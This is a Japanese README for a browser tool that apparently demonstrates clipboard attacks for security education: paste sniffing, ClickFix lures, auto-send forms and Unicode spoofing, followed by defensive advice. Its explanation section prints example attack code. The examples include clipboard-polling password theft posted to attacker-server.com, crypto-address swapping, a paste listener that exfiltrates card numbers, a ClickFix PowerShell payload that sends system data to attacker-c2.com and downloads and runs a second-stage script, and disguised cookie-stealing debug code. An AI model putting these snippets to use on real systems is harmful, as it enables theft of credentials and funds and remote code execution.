<!--
---
id: day033
slug: clipthreat-studio

title: "ClipThreat Studio"

subtitle_ja: "クリップボード悪用攻撃の体験ツール"
subtitle_en: "Clipboard Exploitation Attack Demonstration Tool"

description_ja: "JavaScriptによるクリップボードAPIの悪用手法を再現し、クリック1つで体験できる「クリップボード悪用攻撃の可視化＆体験ツール」です。読み取り・書き込み・paste監視・ClickFix誘導・Unicode文字細工など、心理操作と技術的悪用を組み合わせた脅威を複数タブ構成で体験できます。"
description_en: "An interactive security education tool that demonstrates clipboard API exploitation techniques through a web interface. Experience various clipboard threats including read/write operations, paste monitoring, ClickFix attacks, and Unicode manipulation in a safe, controlled environment."

category_ja:
  - Webセキュリティ
  - ソーシャルエンジニアリング
category_en:
  - Web Security
  - Social Engineering

difficulty: 3

tags:
  - clipboard
  - javascript
  - security
  - clickfix
  - unicode
  - phishing
  - web-security

repo_url: "https://github.com/ipusiron/clipthreat-studio"
demo_url: "https://ipusiron.github.io/clipthreat-studio/"

hub: true
---
-->

# ClipThreat Studio - クリップボード悪用攻撃の体験ツール

![GitHub Repo stars](https://img.shields.io/github/stars/ipusiron/clipthreat-studio?style=social)
![GitHub forks](https://img.shields.io/github/forks/ipusiron/clipthreat-studio?style=social)
![GitHub last commit](https://img.shields.io/github/last-commit/ipusiron/clipthreat-studio)
![GitHub license](https://img.shields.io/github/license/ipusiron/clipthreat-studio)

**Day033 - 生成AIで作るセキュリティツール100**

**ClipThreat Studio** は、JavaScriptによるクリップボードAPIの悪用手法を再現し、クリック1つで体験できる「クリップボード悪用攻撃の可視化＆体験ツール」です。

クリップボードに対する「読み取り」「書き込み」「paste監視」「ClickFix誘導」など、心理操作と技術的悪用を組み合わせた脅威を、複数タブ構成で体験できます。

---

## 🌐 デモページ

👉 [https://ipusiron.github.io/clipthreat-studio/](https://ipusiron.github.io/clipthreat-studio/)

---

## 📸 スクリーンショット

> ![ClickFix攻撃デモ](assets/screenshot.png)
>
> *ClickFix攻撃デモ*

---

## 🎯 特徴

### 📋 基本操作タブ
- `clipboard.readText()` / `.writeText()` API の基本的な動作確認
- クリップボード操作の仕組みとブラウザ制限の理解
- チュートリアル機能で段階的な学習が可能

### 🔍 監視タブ
- クリップボード内容の自動監視・ログ表示
- リアルタイムでのクリップボード変更検出
- 監視間隔の調整とログの詳細表示

### 🎭 盗聴タブ  
- pasteイベントを使ったスニッフィング攻撃の再現
- 入力フィールドでの貼り付け内容の傍受
- ユーザーが気づかない情報漏洩の危険性を体験

### 🚨 ClickFix攻撃タブ
- 修復誘導型コピー攻撃の完全再現
- 偽のエラーダイアログによる心理的誘導
- 「修復」ボタンクリックで悪意あるコードがクリップボードにコピー

### 🧲 自動送信タブ
- 自動ペースト→自動送信型のフォーム偽装攻撃
- 開発者コンソール風UIでの攻撃シミュレーション
- 段階的チュートリアルと対策方法の詳細解説

### 🧪 文字細工タブ
- Unicode文字細工攻撃（ゼロ幅スペース、RTL文字、同形異義文字など）
- 4種類の攻撃パターンを個別に体験可能
- WeirdString Inspector連携による詳細Unicode分析
- 攻撃結果の詳細表示とコードポイント解析

### 🔒 セキュリティTipsタブ
- 包括的な対策ガイドとベストプラクティス
- アイコン付きカテゴリ別の整理された情報
- セキュリティチェックリストによる自己診断機能

### 🎛️ 共通機能
- ❓ ヘルプボタンによる詳細な使い方ガイド
- 📊 各攻撃の結果をタイムスタンプ付きで表示
- 🔄 デモリセット機能で繰り返し体験可能
- 📱 レスポンシブデザインでモバイル対応

---

## 🛠️ 使い方

### 基本的な使用手順

1. **アクセス**: このリポジトリを `git clone` するか、上記の[GitHub Pages上のデモサイト](https://ipusiron.github.io/clipthreat-studio/)にアクセス
2. **ヘルプ確認**: ヘッダー右上の ❓ ボタンで詳細な使い方を確認
3. **タブ切り替え**: 各タブで異なる攻撃手法を体験
4. **チュートリアル**: 各タブのチュートリアル機能で段階的に学習
5. **結果確認**: 各操作の結果とログを詳細に確認
6. **対策学習**: セキュリティTipsタブで技術的背景と防御法を確認

### 推奨学習順序

1. **📋 基本操作** → クリップボードAPIの基礎理解
2. **🔍 監視** → 自動監視の仕組みを体験  
3. **🎭 盗聴** → paste攻撃の危険性を実感
4. **🚨 ClickFix攻撃** → 心理的誘導攻撃を体験
5. **🧲 自動送信** → 自動化攻撃の脅威を理解
6. **🧪 文字細工** → Unicode攻撃の複雑さを認識
7. **🔒 セキュリティTips** → 総合的な対策を学習

---

## 🔍 WeirdString Inspector連携

文字細工タブ（Unicode文字細工攻撃）では、各攻撃デモの実行後に **「🔍 WeirdString Inspectorで調査」** ボタンが表示されます。

### アクセス先URL形式

ボタンをクリックすると、以下の形式でWeirdString Inspectorにアクセスします：

```
https://ipusiron.github.io/weirdstring-inspector/?text={攻撃文字列}&source=clipthreat-studio&attack_type={攻撃タイプ}
```

### パラメーター詳細

| パラメーター | 説明 | 例 |
|-----------|------|-----|
| `text` | 攻撃に使用されたUnicode文字列（URLエンコード済み） | `f%E2%80%8Bl%E2%80%8Ba%E2%80%8Bg.txt` |
| `source` | ClipThreat Studioからのアクセスを示す識別子 | `clipthreat-studio` |
| `attack_type` | 実行された攻撃タイプ | `ゼロ幅スペース攻撃` |

### 連携する攻撃タイプ

- **ゼロ幅スペース攻撃**: 見た目に分からない不可視文字の混入
- **RTL文字拡張子偽装**: 右から左文字による拡張子偽装
- **スクリプト混在攻撃**: 複数文字体系の混在によるフィッシング
- **同形異義文字攻撃**: 見た目が同じ異なる文字によるドメイン偽装

### 実装例

```javascript
// 例：ゼロ幅スペース攻撃の場合
const text = "f\u200Bl\u200Ba\u200Bg.txt";  // 実際の攻撃文字列
const attackType = "ゼロ幅スペース攻撃";
const url = `https://ipusiron.github.io/weirdstring-inspector/?text=${encodeURIComponent(text)}&source=clipthreat-studio&attack_type=${encodeURIComponent(attackType)}`;
window.open(url, '_blank');
```

> **注意**: WeirdString Inspector側でのGETパラメータ受信機能は別途実装予定です。

---

## 🧠 教育・啓発目的での活用例

- セキュリティ研修・授業の教材として
- 展示会・セミナーでの啓発デモツール
- CTFチームやRed Teamの新人教育用
- 「なぜオートフィルを使うべきか」の実感体験

---

## 🧩 フォルダー構成

```
clipthreat-studio/
├── index.html          # メインHTML（タブUI・全コンテンツ）
├── style.css           # 全体スタイル（UI・アニメーション・レスポンシブ）
├── CLAUDE.md           # Claude Code用プロジェクト説明書
├── favicon.svg         # サイトアイコン
├── js/                 # JavaScript機能モジュール
│   ├── main.js         # タブ切り替え・ヘルプモーダル制御
│   ├── clipboard.js    # 基本操作タブ機能
│   ├── watch.js        # 監視タブ機能
│   ├── sniff.js        # 盗聴タブ機能
│   ├── clickfix.js     # ClickFix攻撃タブ機能
│   ├── autopaste.js    # 自動送信タブ機能
│   ├── weirdchar.js    # 文字細工タブ機能（WeirdString Inspector連携）
│   └── tips.js         # セキュリティTipsタブ機能
├── assets/             # 静的リソース
└── README.md           # プロジェクト説明書
```

### 技術構成

- **フロントエンド**: Vanilla JavaScript（フレームワークレス）
- **スタイル**: CSS3（Flexbox・Grid・アニメーション）
- **デプロイ**: GitHub Pages（静的サイト）
- **外部連携**: WeirdString Inspector（GETパラメーター）
- **ファイル構成**: モジュール分割による機能別管理

---

## 🛡️ セキュリティ解説

### クリップボード攻撃の脅威レベル

クリップボード攻撃は、ユーザーが日常的に使用するコピー＆ペースト操作を悪用する高度な攻撃手法です。
とくに危険な点は、ユーザーが攻撃に気づきにくく、機密情報の漏洩や意図しない操作を引き起こす可能性があることです。

### 📋 基本的なクリップボード攻撃シナリオ

#### シナリオ1: パスワード盗取攻撃
```javascript
// 攻撃者が仕込むコード例
setInterval(async () => {
  try {
    const clipboardContent = await navigator.clipboard.readText();
    if (clipboardContent.length > 8 && /[A-Z].*[0-9]|[0-9].*[A-Z]/.test(clipboardContent)) {
      // パスワードらしい文字列を外部サーバーに送信
      fetch('https://attacker-server.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          data: clipboardContent,
          timestamp: Date.now(),
          userAgent: navigator.userAgent
        })
      });
    }
  } catch (e) {
    // 権限エラーは無視
  }
}, 2000);
```

**被害例**: ユーザーがパスワードマネージャーからパスワードをコピーした瞬間に盗取

#### シナリオ2: 暗号通貨アドレス置換攻撃
```javascript
// 攻撃者のマルウェアコード例
setInterval(async () => {
  try {
    const clipboard = await navigator.clipboard.readText();
    // Bitcoin/Ethereumアドレスパターンを検出
    if (/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(clipboard) || 
        /^0x[a-fA-F0-9]{40}$/.test(clipboard)) {
      // 攻撃者のアドレスに置換
      await navigator.clipboard.writeText('bc1qattacker_bitcoin_address_here');
    }
  } catch (e) {}
}, 1000);
```

**被害例**: 送金先アドレスが攻撃者のものにすり替わり、資金が盗取される

### 🎭 ペーストイベント監視攻撃

#### 攻撃の仕組み
悪意のあるWebサイトが入力フィールドに貼り付けられた内容を傍受する攻撃です。

```javascript
// 攻撃サイトに仕込まれるコード
document.addEventListener('paste', async (event) => {
  const pastedData = event.clipboardData.getData('text');
  
  // 機密情報パターンの検出
  const patterns = {
    creditCard: /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/,
    ssn: /\d{3}-\d{2}-\d{4}/,
    email: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/,
    password: /^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!%*#?&]{8,}$/
  };
  
  for (const [type, pattern] of Object.entries(patterns)) {
    if (pattern.test(pastedData)) {
      // 機密情報を外部に送信
      fetch(`https://evil-collector.com/steal/${type}`, {
        method: 'POST',
        body: JSON.stringify({
          data: pastedData,
          url: window.location.href,
          timestamp: Date.now()
        })
      });
      break;
    }
  }
});
```

### 🚨 ClickFix攻撃の詳細メカニズム

#### 攻撃フロー
1. **偽装エラー表示**: 「システムエラーが発生しました」
2. **修復ボタン提示**: 「今すぐ修復」ボタンを表示
3. **悪意コード注入**: ボタンクリックで攻撃コードをクリップボードに書き込み
4. **実行誘導**: PowerShellやコマンドプロンプトでの実行を指示

#### 実際の攻撃コード例
```javascript
// ClickFix攻撃で仕込まれる悪意のあるペイロード
const maliciousPayload = `
powershell -WindowStyle Hidden -Command "
# システム情報を収集
$info = @{
  ComputerName = $env:COMPUTERNAME
  UserName = $env:USERNAME  
  OS = (Get-WmiObject Win32_OperatingSystem).Caption
  IP = (Invoke-WebRequest -Uri 'https://api.ipify.org').Content
}

# 外部サーバーに送信
Invoke-RestMethod -Uri 'https://attacker-c2.com/collect' -Method POST -Body ($info | ConvertTo-Json)

# 追加のマルウェアをダウンロード・実行
Invoke-Expression (Invoke-WebRequest -Uri 'https://attacker-c2.com/payload.ps1').Content
"`;

// 偽の修復ボタンイベント
document.getElementById('fake-fix-button').addEventListener('click', async () => {
  await navigator.clipboard.writeText(maliciousPayload);
  alert('修復コードがクリップボードにコピーされました。PowerShellを開いて貼り付けて実行してください。');
});
```

### 🧪 Unicode文字細工攻撃の技術詳細

#### 1. ゼロ幅スペース攻撃
```javascript
// 見た目: config.txt
// 実際: conf\u200Big.txt (ゼロ幅スペース混入)
const disguisedFilename = "conf\u200Big.txt";
console.log(disguisedFilename === "config.txt"); // false
console.log(disguisedFilename.length); // 11 (config.txt は 10文字)

// セキュリティフィルター回避例
const maliciousScript = "scr\u200Bipt.exe"; // "script.exe" に見える
if (!filename.includes("script")) {
  // フィルターをすり抜けて実行される
  executeFile(maliciousScript);
}
```

#### 2. RTL文字による拡張子偽装
```javascript
// 見た目: harmless.png  
// 実際: harmless\u202Egnp.exe (右から左制御文字による偽装)
const RTL_OVERRIDE = '\u202E';
const maliciousFile = `harmless${RTL_OVERRIDE}gnp.exe`;

// ファイルマネージャーでは "harmless.png" と表示される
// 実際には実行ファイル (.exe)
console.log(maliciousFile); // "harmless‮gnp.exe"
```

#### 3. 同形異義文字攻撃（IDN偽装）
```javascript
// キリル文字を使ったドメイン偽装
const realDomain = "apple.com";          // ラテン文字 'a' (U+0061)
const fakeDomain = "аpple.com";          // キリル文字 'а' (U+0430)

console.log(realDomain === fakeDomain);  // false
console.log(realDomain.charCodeAt(0));   // 97 (ラテン文字)
console.log(fakeDomain.charCodeAt(0));   // 1072 (キリル文字)

// フィッシングサイトへの誘導例
if (window.location.hostname === fakeDomain) {
  // 本物のAppleサイトと同じデザインでフィッシング
  stealCredentials();
}
```

### 🧲 自動送信攻撃の実装例

#### 攻撃シナリオ
開発者がデバッグコードを貼り付けた瞬間に、自動的に機密情報を外部送信する攻撃

```javascript
// 攻撃者が仕込む悪意のあるデバッグコード
console.log("Debug mode activated");

// 一見無害なコード
fetch("https://jsonplaceholder.typicode.com/posts/1")
  .then(response => response.json())
  .then(data => {
    console.log("API response:", data);
    
    // 隠された攻撃コード
    const sensitiveData = {
      localStorage: {...localStorage},
      sessionStorage: {...sessionStorage},
      cookies: document.cookie,
      userAgent: navigator.userAgent,
      currentURL: window.location.href,
      // 環境変数や設定ファイルの内容を探索
      envVars: extractEnvironmentVariables()
    };
    
    // Base64エンコードで目立たなくする
    const encoded = btoa(JSON.stringify(sensitiveData));
    
    // 正常なAPIリクエストに偽装して送信
    fetch("https://api.attacker-analytics.com/collect", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Analytics-ID": encoded  // データを偽装
      },
      body: JSON.stringify({
        event: "debug_session",
        timestamp: Date.now()
      })
    });
  });

function extractEnvironmentVariables() {
  // ブラウザ環境での機密情報抽出
  return {
    platform: navigator.platform,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: `${screen.width}x${screen.height}`,
    // 開発者ツールの使用状況も収集
    devToolsOpen: window.outerHeight - window.innerHeight > 200
  };
}
```

### 🛡️ 攻撃対策とベストプラクティス

#### 1. 技術的対策
- **CSP（Content Security Policy）の実装**
- **クリップボードアクセスの権限管理**
- **入力検証とサニタイゼーション**
- **Unicode正規化処理**

#### 2. ユーザー教育
- **コピー&ペースト前の内容確認**
- **信頼できないサイトでの貼り付け禁止**
- **ファイル名の完全表示設定**
- **定期的なクリップボード履歴の確認**

#### 3. 組織的対策
- **セキュリティ研修の実施**
- **インシデント対応計画の策定**
- **ログ監視とアラート設定**
- **定期的な脆弱性評価**

---

## 📄 ライセンス

MIT License - 詳細は [LICENSE](LICENSE) をご覧ください。

---

## 🛠 このツールについて

本ツールは、「生成AIで作るセキュリティツール100」プロジェクトの一環として開発されました。 このプロジェクトでは、AIの支援を活用しながら、セキュリティに関連するさまざまなツールを100日間にわたり制作・公開していく取り組みを行っています。

プロジェクトの詳細や他のツールについては、以下のページをご覧ください。

🔗 [https://akademeia.info/?page_id=42163](https://akademeia.info/?page_id=42163)
